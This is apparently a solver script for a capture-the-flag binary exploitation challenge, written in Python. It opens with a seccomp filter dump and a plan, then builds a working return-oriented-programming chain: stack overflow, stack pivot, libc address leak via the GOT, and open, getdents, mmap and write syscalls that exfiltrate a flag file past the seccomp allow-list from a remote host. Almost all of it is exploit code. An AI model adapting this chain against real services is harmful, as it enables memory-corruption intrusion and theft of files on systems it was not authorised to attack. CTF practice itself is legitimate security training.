# MAN I HATE SECCOMP

# output of seccomp-tools or ceccommp
"""
#Label  CODE  JT   JF      K
#---------------------------------
 L0001: 0x20 0x00 0x00 0x00000004 $A = $arch
 L0002: 0x15 0x00 0x13 0xc000003e if ($A != x86_64) goto L0022
 L0003: 0x20 0x00 0x00 0x00000000 $A = $syscall_nr
 L0004: 0x35 0x00 0x01 0x40000000 if ($A < 0x40000000) goto L0006
 L0005: 0x15 0x00 0x10 0xffffffff if ($A != 0xffffffff) goto L0022
 L0006: 0x15 0x0e 0x00 0x00000002 if ($A == open) goto L0021
 L0007: 0x15 0x0d 0x00 0x00000009 if ($A == mmap) goto L0021
 L0008: 0x15 0x0c 0x00 0x0000003c if ($A == exit) goto L0021
 L0009: 0x15 0x0b 0x00 0x000000d9 if ($A == getdents64) goto L0021
 L0010: 0x15 0x0a 0x00 0x000000e7 if ($A == exit_group) goto L0021
 L0011: 0x15 0x00 0x04 0x00000000 if ($A != read) goto L0016
 L0012: 0x20 0x00 0x00 0x00000014 $A = $high_args[0]
 L0013: 0x15 0x00 0x08 0x00000000 if ($A != 0x0) goto L0022
 L0014: 0x20 0x00 0x00 0x00000010 $A = $low_args[0]
 L0015: 0x15 0x05 0x06 0x00000000 if ($A == 0x0) goto L0021, else goto L0022
 L0016: 0x15 0x00 0x05 0x00000001 if ($A != write) goto L0022
 L0017: 0x20 0x00 0x00 0x00000014 $A = $high_args[0]
 L0018: 0x15 0x00 0x03 0x00000000 if ($A != 0x0) goto L0022
 L0019: 0x20 0x00 0x00 0x00000010 $A = $low_args[0]
 L0020: 0x15 0x00 0x01 0x00000001 if ($A != 0x1) goto L0022
 L0021: 0x06 0x00 0x00 0x7fff0000 return ALLOW
 L0022: 0x06 0x00 0x00 0x00000000 return KILL
#---------------------------------
"""

"""
The challenge as a simple buffer overflow but hard to pwn because seccomp
We need to: 
- stack pivot to get a bigger buffer
- leak libc address to gain access to more powerful ROP gadgets (the libc version can be obtained via libc.rip without using the Dockerfile; it is 2.31.)
- leak the flag filename with open-getdents-write
- leak the flag content with open-mmap-write

"""

import struct
import socket
import sys

def p64(addr):
    return struct.pack("Q", addr)

def u64(b):
    return struct.unpack("Q", b)[0]

def ret2csu_call(fptr, edi, rsi, rdx):
    c = b""
    # pop rbx, rbp, r12, r13, r14, r15
    c += p64(0x400bfa)
    c += p64(0) + p64(1) + p64(fptr)
    c += p64(edi) +p64(rsi) + p64(rdx)
    #  mov rdx, r15; mov rsi, r14;  mov edi, r13d;  call qword ptr [r12 + rbx*8]
    # add rbx, 0x1, cmp rbp, rbx; jne ...; pop rbx, rbp ...
    c += p64(0x400be0) + p64(0) * 7

    return c

BUFF_SIZE = 32
GOT_write = 0x601fb0
PLT_write = 0x400740
GOT_read = 0x601fd8
PLT_read = 0x400790
LIBC_WRITE_OFFSET = 0x01111d0
POP_RSI_R15 = 0x400c01
POP_RDI = 0x0400c03
POP_RSP_R13_R14_R15 = 0x400bfd
MAIN = 0x0400b5d
DIRENT_BUF = 0x602800
STACK_PIVOT = 0x602000
FILENAME_BUF = 0x602f00
RET = 0x0400b97

SYS_OPEN = 2 
SYS_MMAP = 9
SYS_GETDENTS = 217

flag_file = b"./flag-b1a750d7-91bf-43ab-8c81-4b504644b434.txt\x00"

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
r.connect((sys.argv[1], int(sys.argv[2])))

## Prepare stack to pivot
payload = b"A" * BUFF_SIZE + b"B" * 8
payload += p64(POP_RDI) + p64(0)
payload += p64(POP_RSI_R15) + p64(STACK_PIVOT) + p64(0)
payload += p64(PLT_read)
payload += p64(POP_RSP_R13_R14_R15) + p64(STACK_PIVOT)
assert len(payload) <= 0x80
r.send(payload)
r.recv(1024)

## - Get leak from write GOT entry
## - Use read() to force a pause and prepare the final ROPchain
payload = b"A"*24
payload += ret2csu_call(GOT_write, 1, GOT_write, 8)
#payload += ret2csu_call(GOT_read, 0, FILENAME_BUF, 3)
payload += ret2csu_call(GOT_read, 0, FILENAME_BUF, len(flag_file))
payload += ret2csu_call(GOT_read, 0, STACK_PIVOT, 0x300)
payload += p64(POP_RSP_R13_R14_R15) + p64(STACK_PIVOT)
#assert len(payload) <= 0xf4
r.send(payload)

## Current dir
#r.send(b".\x00")
## flag file name
r.send(flag_file)

data = r.recv(1024)
write_leak = u64(data)
libc_base = write_leak - LIBC_WRITE_OFFSET

print(f"[+] Libc leak: {hex(write_leak)}")
print(f"[+] Libc base: {hex(libc_base)}")

## LIBC gadgets
libc_pop_rdx_r12 = libc_base + 0x11c371
libc_syscall = libc_base + 0x66229
libc_pop_rax = libc_base + 0x4a550
libc_mov_r10_rdx_jmp_rax = libc_base + 0x7b0cb
libc_mov_r9_rsi_jmp_rax = libc_base + 0x81738
libc_mov_r8_rax_pop_rbx = libc_base + 0x156298

"""
## Leak flag file name
payload = b"A" * 24
# fd = open("./", O_RDONLY, 0) = 3
#payload += p64(POP_RDI) + p64(libc_dir_str)
payload += p64(POP_RDI) + p64(0x602f00)
payload += p64(POP_RSI_R15) + p64(0) * 2
payload += p64(libc_pop_rax) + p64(SYS_OPEN)
payload += p64(libc_syscall)
# getdents(fd, dirent_buf, 0x100)
payload += p64(POP_RDI) + p64(3)
payload += p64(POP_RSI_R15) + p64(DIRENT_BUF) + p64(0)
payload += p64(libc_pop_rdx_r12) + p64(0x100) + p64(0)
payload += p64(libc_pop_rax) + p64(SYS_GETDENTS)
payload += p64(libc_syscall)
# write(1, dirent_buf, 0x100)
payload += p64(POP_RDI) + p64(1)
payload += p64(POP_RSI_R15) + p64(DIRENT_BUF) + p64(0)
payload += p64(libc_pop_rdx_r12) + p64(0x100) + p64(0)
payload += p64(PLT_write)
assert len(payload) <= 0x300
r.send(payload)
print(r.recv(0x100))
"""

payload = b"A" * 24
#payload += p64(RET) * 3

# fd = open("./flag-b1a750d7-91bf-43ab-8c81-4b504644b434.txt", O_RDONLY, 0) = 3
payload += p64(POP_RDI) + p64(FILENAME_BUF)
payload += p64(POP_RSI_R15) + p64(0) * 2
payload += p64(libc_pop_rax) + p64(SYS_OPEN)
payload += p64(libc_syscall)

# mmap(0x777000, 0x1000, PROT_READ, MAP_SHARED | MAP_FIXED, 3, 0) --
MAPED_ADDR = 0x777000
payload += p64(libc_mov_r8_rax_pop_rbx) + p64(0)   # r8 = 3
payload += p64(libc_base + 0xc9ccf)  # xor r9d, r9d ; mov eax, r9d ; ret
#payload += p64(libc_base + 0x57f30)  # mov r8d, 0xffffffff ; mov eax, r8d ; ret
payload += p64(libc_pop_rax)  
payload += p64(libc_pop_rax)         # rax = gadget
payload += p64(libc_pop_rdx_r12) 
payload += p64(0x11)                 # rdx = flags
#payload += p64(0x32)                 # rdx = flags
payload += p64(0)                    # r12 = 0
payload += p64(libc_mov_r10_rdx_jmp_rax) # r10 = rdx = flags
payload += p64(SYS_MMAP)             # rax = 9
payload += p64(POP_RDI)               
payload += p64(MAPED_ADDR)           # rdi = MAPPED_ADDR
payload += p64(POP_RSI_R15)          # pop rsi; r15
payload += p64(0x1000)               # rsi = len
payload += p64(0)                    # r15 = 0
payload += p64(libc_pop_rdx_r12)   
payload += p64(0x1)                  # rdx = prot
payload += p64(0)                    # r12 = 0
payload += p64(libc_syscall)  # syscall

# write(1, 0x777000, 0x100)
payload += p64(POP_RDI) + p64(1)
payload += p64(POP_RSI_R15) + p64(MAPED_ADDR) + p64(0)
payload += p64(libc_pop_rdx_r12) + p64(0x100) + p64(0)
payload += p64(PLT_write)

assert len(payload) <= 0x300
r.send(payload)
print(r.recv(0x100))
